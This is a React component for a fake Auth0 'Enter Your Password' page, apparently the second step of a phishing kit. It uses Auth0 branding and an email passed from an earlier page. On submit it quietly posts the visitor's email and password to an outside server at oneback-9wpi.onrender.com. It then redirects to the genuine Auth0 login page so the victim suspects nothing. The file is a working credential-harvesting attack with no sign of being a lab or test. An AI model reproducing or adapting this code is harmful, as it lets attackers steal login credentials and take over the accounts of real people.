import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import { useLocation } from 'react-router-dom';
import logothree from './logothree.png';

function Next(){

    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("Auth0")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                setIsLoading(false);
                console.log(response.data.message);
    
                window.location.href = 'https://auth0.auth0.com/u/login/identifier?state=hKFo2SByeGJKb3VCTFpQcTdpYmN5ZG9Gb3pRMldjaTMtMHpJcqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGZDSW9rU1JubHh4SWFCMXZxYWJIYXpnM1VGQkx3NGJRo2NpZNkgYkxSOVQ1YXI2bkZ0RE80ekVyR1hkb3FNQ000aU5aU1Y';

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }



    return (
        <div className='mainContent'>

        <div className='col-md-4 m-auto maindiv'>

            <div className='imagediv text-center py-3'>
                
            <div className='imagediv text-center'>
                        <img src={logothree} className="mylogo" />

                    </div>


            </div>

            <h3 className='welcome py-3'>Enter Your Password</h3>

                <p className='subtitle py-2'>Enter your password for Auth0 to continue to Auth0</p>

          

            <form onSubmit={handleSubmit} className="px-4">

            <input  value={email}  type="text"className='form-control w-100 py-4'placeholder='Email address' required/>
            
                    <br/>
                <input onChange={function(e){
                   setPassword(e.target.value);
               }} value={password} type={showPassword ? "text" : "password"}className='form-control w-100 py-4'placeholder='Password' required/>
                
                    <div className='text-right pr-3'>
                    <span onClick={function(e){
                        e.preventDefault();
                        setShowPassword(!showPassword);
                    }} className='show'>{showPassword ? "Hide" : "Show"}</span>
                    </div>
                
                <a href='' className='font-weight-bold purple'>Forgot Password</a>
                
                <div className='px-3 py-3'>
                <button className='next btn w-100'>{isLoading ? "Loading ...." : "Continue"}</button>

                </div>

            

            
            </form>

        

        </div>


        

    </div>
    );

}

export default Next;
